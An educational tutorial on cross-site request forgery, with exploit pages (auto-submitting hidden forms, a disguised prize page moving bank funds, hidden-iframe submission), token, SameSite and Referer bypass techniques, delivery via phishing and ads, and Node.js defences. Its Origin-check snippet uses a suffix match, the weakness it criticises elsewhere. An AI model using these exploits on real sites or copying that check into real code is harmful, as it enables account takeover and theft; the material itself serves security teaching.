# Cross-Site Request Forgery (CSRF)

Cross-site request forgery (CSRF) is a web security vulnerability that tricks authenticated users into unknowingly submitting malicious requests to applications they are currently logged into, effectively hijacking the victim's authenticated session to perform unauthorized actions without their knowledge or consent. Unlike XSS, which injects malicious code into a trusted website to attack users, CSRF works in the opposite direction—exploiting the trust a web application has in the user's browser by leveraging the browser's automatic inclusion of session cookies in every request to a domain, regardless of which site triggered the request. The attack is powerful because it partially circumvents the Same-Origin Policy: while that policy prevents a malicious site from reading cross-origin responses, it does not prevent a malicious site from causing a victim's browser to send cross-origin requests with the victim's authentication credentials attached. A successful CSRF attack can change account email addresses, reset passwords, transfer funds, modify user permissions, post content, delete data, or perform any action the victim user can perform on the vulnerable application—with the severity escalating dramatically when the compromised user is an administrator, potentially giving the attacker full control over the application and all its data.

The core exploitation mechanism: **attacker's page triggers a cross-origin request; victim's browser automatically includes session cookies; server cannot distinguish legitimate from forged requests**.

## What is CSRF?

### Understanding CSRF

**Definition:** A web security attack that induces authenticated users to unknowingly perform unintended actions on a web application by exploiting the browser's automatic inclusion of session credentials in all requests to a domain.

**Also known as:**
- CSRF (Cross-Site Request Forgery)
- XSRF
- Sea-surf
- Session riding
- One-click attack
- Cross-site reference forgery

**The fundamental trust exploitation:**

```
Normal request flow (legitimate):
User Browser ──→ victim-site.com/change-email (with session cookie)
                 ↑ Server trusts request (valid session cookie)

CSRF attack flow:
Attacker Site ──→ User Browser ──→ victim-site.com/change-email (with session cookie)
                  ↑ Browser automatically adds cookie!
                  Server still trusts request (can't distinguish!)
```

**What CSRF is and isn't:**

```
CSRF IS:
✓ Attacker inducing victim to send requests
✓ Exploiting browser's automatic cookie inclusion
✓ Performing actions using victim's authenticated session
✓ One-directional (attacker can send but not read responses)
✓ A state-changing attack (modifies data/settings)

CSRF IS NOT:
✗ Stealing cookies or session tokens
✗ Reading responses from the victim's browser
✗ Injecting code into the application
✗ Directly accessing victim's data
✗ Bypassing authentication (victim must be authenticated)
```

### Relationship to Same-Origin Policy

```
Same-Origin Policy (SOP) restricts:
✗ Reading responses from different origins
✗ Making certain cross-origin requests (complex requests need preflight)

SOP does NOT prevent:
✓ Sending cross-origin GET requests (images, scripts, etc.)
✓ Submitting HTML forms cross-origin
✓ Browser including cookies with cross-origin requests

CSRF exploits the gap:
Attacker's site submits form to victim-site.com ← SOP allows this
Browser includes victim-site.com session cookie ← SOP allows this
Server processes request as legitimate         ← CSRF succeeds
Attacker cannot read response                  ← SOP blocks this
```

## How CSRF Works

### Three required conditions

For a CSRF attack to be possible, three key conditions must all be present simultaneously:

**Condition 1: A relevant, exploitable action**

```
Action must be:
✓ Performable with HTTP request(s)
✓ Meaningful to attacker (state-changing)
✓ Not requiring data attacker cannot predict/know

Examples of exploitable actions:
- Change account email address
- Change password (if no current password required)
- Add/remove administrator privileges
- Transfer funds or points
- Make purchases
- Delete accounts or data
- Submit posts/messages as victim
- Change security settings
- Approve/reject pending requests

Examples NOT exploitable (unless combined with other attacks):
- View personal data (read-only)
- Change password when current password required
- Actions requiring OTP or 2FA code
- Actions requiring secret value attacker cannot know
```

**Condition 2: Cookie-based session handling**

```
Exploitable scenario:
Application tracks sessions only via cookies
Browser automatically sends cookies cross-origin
No additional per-request verification

POST /change-email HTTP/1.1
Host: vulnerable-site.com
Cookie: session=yvthwsztyeQkAPzeQ5gHgTvlyxHfsAfE  ← Automatically included

Server validates: Is session cookie valid? → Yes → Process request

Not exploitable if application ALSO requires:
✗ Custom request header (e.g., X-Requested-With)
✗ CSRF token in request body/parameter
✗ Re-authentication for sensitive actions
✗ Secret value only legitimate client would know
```

**Condition 3: No unpredictable request parameters**

```
Exploitable - all parameters predictable:
POST /change-email HTTP/1.1
Body: email=new@attacker.com

Attacker knows: email field, target value (their own email)
Can construct valid request: ✓ VULNERABLE

Not exploitable - unpredictable parameter:
POST /change-password HTTP/1.1
Body: current_password=UNKNOWN&new_password=attacker123

Attacker doesn't know: victim's current password
Cannot construct valid request: ✗ NOT DIRECTLY EXPLOITABLE

Not exploitable - CSRF token:
POST /change-email HTTP/1.1
Body: email=new@attacker.com&csrf_token=r4nd0mS3cr3tT0k3n

Attacker doesn't know: CSRF token value (changes per session/request)
Cannot construct valid request: ✗ NOT EXPLOITABLE
```

### Full attack scenario

**Vulnerable application:**

```http
Vulnerable email change request:
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Cookie: session=yvthwsztyeQkAPzeQ5gHgTvlyxHfsAfE

email=wiener@normal-user.com

Analysis against conditions:
✓ Condition 1: Email change enables account takeover (attacker triggers password reset)
✓ Condition 2: Only session cookie used for authentication, no CSRF token
✓ Condition 3: Only parameter is email address, fully attacker-controlled
Result: VULNERABLE TO CSRF
```

**Attacker's exploit page:**

```html
<!-- attacker-website.com/csrf-exploit.html -->
<html>
    <body>
        <h1>You've won a prize! Click below to claim.</h1>
        
        <!-- Hidden form targeting vulnerable site -->
        <form action="https://vulnerable-website.com/email/change" method="POST">
            <input type="hidden" name="email" value="attacker@evil-user.net" />
        </form>
        
        <!-- Auto-submit on page load -->
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```

**Attack execution flow:**

```
Step 1: Victim logs in to vulnerable-website.com
Session cookie set: session=yvthwsztyeQkAPzeQ5gHgTvlyxHfsAfE

Step 2: Attacker tricks victim into visiting exploit page
(via phishing email, social media link, etc.)

Step 3: Victim's browser loads attacker's page

Step 4: JavaScript auto-submits hidden form

Step 5: Browser sends request to vulnerable-website.com:
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Cookie: session=yvthwsztyeQkAPzeQ5gHgTvlyxHfsAfE  ← Automatically included!
Referer: https://attacker-website.com/csrf-exploit.html

email=attacker@evil-user.net

Step 6: vulnerable-website.com processes request:
- Valid session cookie? ✓ Yes
- Valid email format? ✓ Yes
- Changes email to: attacker@evil-user.net ✓

Step 7: Attacker now controls victim's email address

Step 8: Attacker requests password reset for victim's account
Reset link sent to attacker@evil-user.net

Step 9: Attacker clicks reset link, sets new password

Step 10: Full account takeover complete!
```

### GET-based CSRF

**Even simpler with GET requests:**

```html
<!-- If email change uses GET method -->
<!-- Entire attack fits in a single tag! -->

<img src="https://vulnerable-website.com/email/change?email=attacker@evil.net">

<!-- When victim loads any page containing this tag:
1. Browser attempts to load "image"
2. Sends GET request to vulnerable-website.com
3. Session cookie automatically included
4. Email changed silently
5. Victim unaware (failed image is normal)
-->
```

**Self-contained GET attack (no external page needed):**

```
If reflected XSS + GET CSRF possible:
Attacker constructs single malicious URL on vulnerable domain:
https://vulnerable-website.com/search?q=<img src="/email/change?email=attacker@evil.net">

Victim clicks URL → Search page reflected → CSRF executes
No external site needed!
```

## Impact of CSRF Attacks

### Severity by action type

**Critical impact actions:**

```
Account takeover:
- Change email → Trigger password reset → Full access
- Change password (if no current password required) → Immediate lockout
- Add attacker as account administrator

Financial impact:
- Transfer funds to attacker
- Make purchases with victim's payment method
- Redeem loyalty points/credits
- Cancel subscriptions or orders

Data manipulation:
- Delete critical data
- Exfiltrate data (indirectly, if action triggers data exposure)
- Modify important settings

Privilege escalation:
- Grant attacker administrative role
- Elevate attacker's account permissions
- Approve pending privilege requests
```

**Impact amplification with admin CSRF:**

```
Regular user CSRF:
✓ Change that user's email/password
✓ Perform actions as that user
✗ Cannot affect other users directly

Administrator CSRF:
✓ Create/delete/modify any user account
✓ Change application configuration
✓ Grant admin privileges to attacker's account
✓ Access all data and functionality
✓ Potentially full application compromise
```

### CSRF vs. XSS impact comparison

```
XSS:
- Executes arbitrary JavaScript
- Can read responses (same-origin execution)
- Can steal cookies, CSRF tokens
- Full client-side control

CSRF:
- Induces specific HTTP requests
- Cannot read responses (cross-origin)
- Cannot steal data directly
- Limited to actions the victim can perform

Combined (XSS + CSRF):
- Use XSS to steal CSRF token
- Use CSRF token to perform protected action
- Full account control despite CSRF protections
```

## Constructing CSRF Attacks

### Manual construction

**Basic POST form:**

```html
<!DOCTYPE html>
<html>
<head><title>CSRF PoC</title></head>
<body onload="document.forms[0].submit()">
    <form action="https://target.com/account/email" method="POST">
        <input type="hidden" name="email" value="attacker@evil.com">
    </form>
</body>
</html>
```

**With multiple parameters:**

```html
<html>
<body onload="document.forms[0].submit()">
    <form action="https://target.com/account/update" method="POST">
        <input type="hidden" name="username" value="admin">
        <input type="hidden" name="email" value="attacker@evil.com">
        <input type="hidden" name="role" value="administrator">
        <input type="hidden" name="status" value="active">
    </form>
</body>
</html>
```

**Disguised with social engineering:**

```html
<html>
<head>
    <title>Claim Your Reward</title>
    <style>
        body { font-family: Arial; text-align: center; padding: 50px; }
        .prize-btn { padding: 20px 40px; font-size: 24px; background: gold; cursor: pointer; }
    </style>
</head>
<body>
    <h1>🎁 Congratulations! You've won a prize!</h1>
    <p>Click below to claim your $1000 reward:</p>
    
    <!-- Hidden form (victim doesn't see this) -->
    <form id="csrf-form" action="https://bank.com/transfer" method="POST" style="display:none">
        <input type="hidden" name="to_account" value="ATTACKER_ACCOUNT">
        <input type="hidden" name="amount" value="10000">
    </form>
    
    <!-- Visible button (victim clicks this) -->
    <button class="prize-btn" onclick="document.getElementById('csrf-form').submit()">
        CLAIM REWARD
    </button>
</body>
</html>
```

**Using Burp Suite CSRF PoC Generator:**

```
Process:
1. Intercept target request in Burp Proxy
2. Right-click request → Engagement Tools → Generate CSRF PoC
3. Burp generates HTML with all parameters pre-filled
4. Click "Test in browser" to verify
5. Copy HTML for deployment

Generated output example:
<html>
  <body>
    <form action="https://target.com/email/change" method="POST">
      <input type="hidden" name="email" value="test&#64;test&#46;com" />
      <input type="hidden" name="confirm_email" value="test&#64;test&#46;com" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

### Dealing with JSON content type

**Challenge: `Content-Type: application/json` CSRF**

```javascript
// Standard HTML forms cannot set Content-Type: application/json
// Forms use: application/x-www-form-urlencoded OR multipart/form-data

// If server strictly requires application/json:
// HTML form CSRF is blocked (CORS preflight triggered)

// Bypass: If server accepts wrong content-type
// Test: Send JSON as form-urlencoded
<form action="https://target.com/api/update" method="POST">
    <input type="hidden" name='{"email":"attacker@evil.com","ignore":"' value='"}'>
</form>

// Body: %7B%22email%22%3A%22attacker%40evil.com%22%2C%22ignore%22%3A%22=%22%7D
// Some parsers extract JSON from malformed body

// More reliable: XHR with CORS
// If CORS misconfigured to allow attacker's origin:
<script>
var xhr = new XMLHttpRequest();
xhr.open('POST', 'https://target.com/api/update', true);
xhr.setRequestHeader('Content-Type', 'application/json');
xhr.withCredentials = true;
xhr.send('{"email":"attacker@evil.com"}');
</script>
// But this requires CORS misconfiguration, not standalone CSRF
```

## Delivering CSRF Exploits

### Attack delivery vectors

**Method 1: Phishing email**

```
Attacker sends email:
Subject: "Your account has been limited - action required"
Body: "Click here to verify your account: http://attacker.com/verify"

Victim clicks → Lands on attacker's page → CSRF executes silently
```

**Method 2: Malicious website link**

```
Social media post: "Check out this amazing deal! [link]"
Forum comment: "Here's the answer to your question: [link]"
Search engine optimization: Attacker's page ranks for relevant search terms
```

**Method 3: Stored in target application**

```html
<!-- If target site has a comment/post feature without XSS protection -->
<!-- Stored image tag CSRF: -->
<img src="https://target.com/email/change?email=attacker@evil.com">

When any user views the comment:
1. Browser attempts to load "image"
2. GET request sent to target.com
3. User's session cookie included automatically
4. Email changed silently
No external site needed!
```

**Method 4: Iframe embedding**

```html
<!-- Host malicious content on any site -->
<iframe src="http://attacker.com/csrf-exploit.html" style="display:none">
</iframe>

<!-- Embedded invisibly in legitimate-looking pages -->
<!-- Can be hidden in ad networks, forums, etc. -->
```

**Method 5: Malicious advertisement**

```
Attacker uploads advertising content containing CSRF:
<img src="https://target.com/account/delete" style="display:none">

Ad network serves to users of legitimate sites
Any logged-in user viewing the ad is attacked
```

### Maximizing attack effectiveness

**Invisible attack (victim unaware):**

```html
<html>
<head>
    <!-- No visible indication of attack -->
    <style>body { margin: 0; overflow: hidden; }</style>
</head>
<body>
    <!-- Form hidden, auto-submits, no page change visible -->
    <form action="https://target.com/email/change" method="POST" target="hidden_frame">
        <input type="hidden" name="email" value="attacker@evil.com">
    </form>
    <iframe name="hidden_frame" style="display:none"></iframe>
    <script>
        // Submit to hidden iframe - no navigation visible
        document.forms[0].submit();
    </script>
    
    <!-- Show decoy content to victim -->
    <div>Loading awesome cat pictures...</div>
    <img src="cats.gif">
</body>
</html>
```

**Timing consideration:**

```
Ensure victim is logged in when attack occurs

Options:
1. Link to attacker's page directly (victim likely already logged in)
2. Use context when victim is definitely authenticated
   - Email sent immediately after login link
   - Attack page served right after victim logs in elsewhere
3. Use persistent techniques (stored CSRF in target site)
   - Waits for any logged-in user to trigger it
```

## Common Defences Against CSRF

### Defence 1: CSRF tokens

**How CSRF tokens work:**

```
1. Server generates cryptographically random token
2. Associates token with user's session
3. Includes token in every form as hidden field
4. Client must submit token with state-changing requests
5. Server validates token before processing

Attacker cannot:
- Read victim's page (blocked by Same-Origin Policy)
- Know or predict the random token value
- Construct valid request without token
- Forge request on victim's behalf

Result: CSRF attack fails - token missing or wrong
```

**Implementation:**

```html
<!-- Server includes CSRF token in form -->
<form action="/email/change" method="POST">
    <input type="email" name="email" value="">
    
    <!-- CSRF token as hidden field -->
    <input type="hidden" name="csrf_token" value="r4nd0mS3cr3t_k39fH2pQr_x7mN">
    
    <button type="submit">Change Email</button>
</form>
```

```javascript
// Server-side validation (Node.js example)
app.post('/email/change', (req, res) => {
    const sessionToken = req.session.csrfToken;
    const submittedToken = req.body.csrf_token;
    
    // Validate token
    if (!submittedToken || submittedToken !== sessionToken) {
        return res.status(403).send('CSRF token validation failed');
    }
    
    // Token valid - process request
    updateUserEmail(req.user.id, req.body.email);
    res.redirect('/account');
});
```

**Token security requirements:**

```
Secure CSRF token must be:
✓ Cryptographically random (high entropy)
✓ Unique per session (at minimum)
✓ Ideally unique per request
✓ Not predictable from previous tokens
✓ Not transmitted in URL (visible in logs/referer)
✓ Long enough (128 bits minimum)
✓ Validated server-side on every submission

Insecure token characteristics:
✗ Sequential numbers (1, 2, 3...)
✗ Timestamp-based
✗ Derived from user ID
✗ Short length (guessable)
✗ Same token across all users
✗ Validated only client-side
```

**CSRF token bypass vulnerabilities:**

```
1. Token not validated:
   POST /email/change
   csrf_token=[any value]
   → Server doesn't check token value!

2. Token tied to pool, not session:
   POST /email/change
   csrf_token=ATTACKER_OWN_TOKEN
   → Server validates token exists (not that it belongs to victim)

3. Token transmitted in URL:
   POST /email/change?csrf_token=abc123
   → Visible in Referer headers, server logs

4. Method swap bypass:
   Original: POST /email/change (has CSRF validation)
   Attack: GET /email/change?email=attacker@evil.com
   → Some apps don't validate CSRF on GET requests!

5. Token tied to wrong session:
   CSRF token tied to cookie, not session
   Attacker sets known cookie on victim via subdomain/cookie tossing
   Attacker knows corresponding CSRF token
```

### Defence 2: SameSite cookies

**How SameSite works:**

```
SameSite cookie attribute controls when browser sends cookies
with cross-origin requests

Set-Cookie: session=abc123; SameSite=Strict
Set-Cookie: session=abc123; SameSite=Lax
Set-Cookie: session=abc123; SameSite=None; Secure
```

**SameSite=Strict:**

```http
Set-Cookie: session=abc123; SameSite=Strict

Behavior:
- Cookie sent ONLY for same-site requests
- Never sent with cross-origin requests

When cookie IS sent:
✓ User types URL directly in address bar
✓ User clicks bookmark
✓ JavaScript makes same-origin request
✓ Form submitted within same site

When cookie NOT sent:
✗ Cross-site form submission (CSRF attack blocked!)
✗ Cross-site iframe
✗ Cross-site link followed (user clicks link on attacker's site!)
✗ Cross-site image requests

Limitation:
- Even clicking legitimate link from another site
  (e.g., from Google to victim-site.com) doesn't include cookie!
- May break legitimate functionality
- Overly strict for some use cases
```

**SameSite=Lax (Chrome default since 2021):**

```http
Set-Cookie: session=abc123; SameSite=Lax

Behavior:
- Cookie sent for "safe" cross-site navigation (top-level GET)
- Not sent for cross-site POST or subresource requests

When cookie IS sent:
✓ User clicks link from another site (top-level navigation, GET)
✓ Cross-site GET redirects
✓ Same-site requests (all types)

When cookie NOT sent:
✗ Cross-site POST form submission (CSRF attack blocked!)
✗ Cross-site PUT/PATCH/DELETE
✗ Cross-site iframe
✗ Cross-site image/script requests

Balance:
- Preserves legitimate linking/navigation
- Blocks most CSRF attacks
- Default in Chrome since 2021
```

**SameSite=None:**

```http
Set-Cookie: session=abc123; SameSite=None; Secure

Behavior:
- Cookie sent with all cross-site requests
- Requires Secure flag (HTTPS only)
- Old behavior (before SameSite existed)
- Use only when cross-site embedding genuinely required

Warning:
- Provides NO CSRF protection
- Only use when explicitly needed
```

**SameSite bypass techniques:**

```
Bypass 1: Method manipulation
SameSite=Lax allows GET cross-site
If sensitive action accepts GET:
GET /email/change?email=attacker@evil.com  ← Allowed by Lax!

Bypass 2: Using window.open()
Some browsers send cookies with window.open() top-level navigation
window.open('https://victim.com/email/change?email=attacker@evil.com')

Bypass 3: Subdomain attack
SameSite considers subdomains as "same site"
If attacker controls subdomain.victim.com:
→ Can initiate requests to victim.com with cookies included

Bypass 4: Newly issued cookies
Chrome's cookie refresh policy:
New cookies have 2-minute grace period without SameSite restrictions
If authentication can be triggered, fresh cookies vulnerable

Bypass 5: JavaScript-based requests
Some frameworks use GET with JavaScript for state-changing actions
Lax SameSite still allows GET cross-site
```

**Cross-site vs. same-site distinction:**

```
Same-site (cookies sent with Lax/Strict):
https://example.com      → https://example.com ✓
https://sub.example.com  → https://example.com ✓
http://example.com       → https://example.com ✓ (scheme ignored for same-site)

Cross-site (cookies blocked with Lax/Strict):
https://attacker.com     → https://example.com ✗
https://attacker.net     → https://example.com ✗
https://evil-example.com → https://example.com ✗
```

### Defence 3: Referer header validation

**How Referer-based validation works:**

```http
Request from legitimate page:
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Referer: https://vulnerable-website.com/account
Cookie: session=abc123

Server checks: Does Referer start with https://vulnerable-website.com?
Yes → Request allowed

CSRF request from attacker's page:
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Referer: https://attacker-website.com/csrf-exploit.html
Cookie: session=abc123

Server checks: Does Referer start with https://vulnerable-website.com?
No → Request blocked
```

**Why Referer validation is less effective:**

```
Problem 1: Referer can be suppressed
HTML: <meta name="referrer" content="no-referrer">
Or Referrer-Policy header

Attack exploit page:
<html>
<head>
    <meta name="referrer" content="no-referrer">
</head>
<body onload="document.forms[0].submit()">
    <form action="https://target.com/email/change" method="POST">
        <input type="hidden" name="email" value="attacker@evil.com">
    </form>
</body>
</html>

Request sent:
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Cookie: session=abc123
(No Referer header!)

If server only blocks wrong Referer (but allows missing):
→ Attack succeeds with no Referer!

Problem 2: Weak validation logic
// Validates Referer CONTAINS target domain (not STARTS WITH):
if (referer.includes('vulnerable-website.com')) { allow; }

Bypass: https://attacker.com/vulnerable-website.com/csrf
→ Contains "vulnerable-website.com" → Passes validation!

// Validates ENDS WITH domain:
if (referer.endsWith('vulnerable-website.com')) { allow; }

Bypass: https://evil-vulnerable-website.com/csrf
→ Ends with "vulnerable-website.com" → Passes validation!

Problem 3: Not reliable for defence
- Mobile apps may not send Referer
- Some privacy tools strip Referer
- Browser extensions may modify Referer
- HTTPS to HTTP transitions drop Referer
- Legitimate requests may have unexpected Referer values
```

**When Referer validation fails:**

```
Scenarios where missing Referer is normal:
1. HTTPS page to HTTP page (Referer dropped for security)
2. Browser privacy settings/extensions strip Referer
3. Direct URL navigation (bookmarks, typed URLs)
4. Some mobile browsers
5. Custom HTTP clients/tools

Attacker exploits any of these:
"If you allow requests with missing Referer, 
I'll just suppress Referer in my attack"

Referer should be supplementary, never primary CSRF defence
```

## CSRF in Other Authentication Contexts

### HTTP Basic Authentication CSRF

```http
GET /admin/delete-user?id=123 HTTP/1.1
Host: target.com
Authorization: Basic dXNlcjpwYXNz  ← Browser auto-includes!

When victim's browser has saved Basic Auth credentials for target.com:
CSRF attack page triggers request
Browser automatically includes Authorization header
Target processes as authenticated request

Protection:
CSRF tokens still required even with Basic Auth
Browser authentication ≠ user-initiated action
```

### Certificate-based authentication CSRF

```
Client certificates automatically presented by browser
Similar to cookies: automatically included in requests
Same CSRF risk exists
Application must still implement CSRF tokens
```

## Prevention Summary

### Defence-in-depth approach

**Primary defence: CSRF tokens + SameSite cookies**

```http
// Server sets cookies with SameSite
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Lax

// AND includes CSRF token in forms
<input type="hidden" name="csrf_token" value="r4nd0mT0k3n">

// AND validates both server-side
```

**Complete server-side implementation:**

```javascript
const express = require('express');
const crypto = require('crypto');
const session = require('express-session');

app.use(session({
    secret: process.env.SESSION_SECRET,
    cookie: {
        httpOnly: true,
        secure: true,
        sameSite: 'lax',    // SameSite=Lax as first defence
        maxAge: 3600000
    }
}));

// Generate CSRF token per session
app.use((req, res, next) => {
    if (!req.session.csrfToken) {
        req.session.csrfToken = crypto.randomBytes(32).toString('hex');
    }
    res.locals.csrfToken = req.session.csrfToken;
    next();
});

// Validate CSRF token middleware
function validateCsrf(req, res, next) {
    // Only validate state-changing methods
    if (['GET', 'HEAD', 'OPTIONS'].includes(req.method)) {
        return next();
    }
    
    const sessionToken = req.session.csrfToken;
    const submittedToken = req.body.csrf_token || req.headers['x-csrf-token'];
    
    if (!submittedToken || submittedToken !== sessionToken) {
        return res.status(403).json({ error: 'CSRF validation failed' });
    }
    
    // Regenerate token after use (optional: per-request tokens)
    req.session.csrfToken = crypto.randomBytes(32).toString('hex');
    
    next();
}

// Apply to state-changing routes
app.post('/email/change', validateCsrf, (req, res) => {
    // Process safely
});

app.post('/account/delete', validateCsrf, (req, res) => {
    // Process safely
});

// Template includes token automatically
app.get('/account', (req, res) => {
    res.render('account', {
        csrfToken: res.locals.csrfToken,
        user: req.user
    });
});
```

```html
<!-- Template: account.html -->
<form action="/email/change" method="POST">
    <label>New Email:</label>
    <input type="email" name="email" required>
    
    <!-- CSRF token always included -->
    <input type="hidden" name="csrf_token" value="{{csrfToken}}">
    
    <button type="submit">Update Email</button>
</form>
```

**AJAX/API requests:**

```javascript
// For AJAX requests, use custom header
// Cross-origin requests cannot set custom headers (CORS blocks)
// So presence of custom header proves same-origin request

// Frontend JavaScript:
function csrfFetch(url, options = {}) {
    return fetch(url, {
        ...options,
        headers: {
            ...options.headers,
            'X-CSRF-Token': getCsrfToken(),  // Read from meta tag or cookie
            'Content-Type': 'application/json'
        },
        credentials: 'same-origin'
    });
}

// Get token from meta tag:
function getCsrfToken() {
    return document.querySelector('meta[name="csrf-token"]').content;
}

// HTML includes token in meta:
<head>
    <meta name="csrf-token" content="{{csrfToken}}">
</head>

// Server validates:
app.post('/api/update', (req, res) => {
    const token = req.headers['x-csrf-token'];
    if (token !== req.session.csrfToken) {
        return res.status(403).json({ error: 'Invalid CSRF token' });
    }
    // Process request
});
```

### Additional security measures

**Origin header validation:**

```javascript
// Check Origin header (browsers always send for cross-origin requests)
app.use((req, res, next) => {
    if (['POST', 'PUT', 'PATCH', 'DELETE'].includes(req.method)) {
        const origin = req.headers.origin;
        const host = req.headers.host;
        
        if (origin && !origin.endsWith(host)) {
            return res.status(403).send('Forbidden');
        }
    }
    next();
});
```

**Re-authentication for sensitive actions:**

```javascript
// For highest-risk actions (password change, account deletion):
app.post('/account/delete', async (req, res) => {
    // Require current password confirmation
    const { current_password } = req.body;
    const user = await db.users.findById(req.user.id);
    
    if (!await bcrypt.compare(current_password, user.passwordHash)) {
        return res.status(401).send('Current password required');
    }
    
    // Even if CSRF bypassed, attacker needs current password
    await db.users.delete(req.user.id);
    res.redirect('/goodbye');
});
```
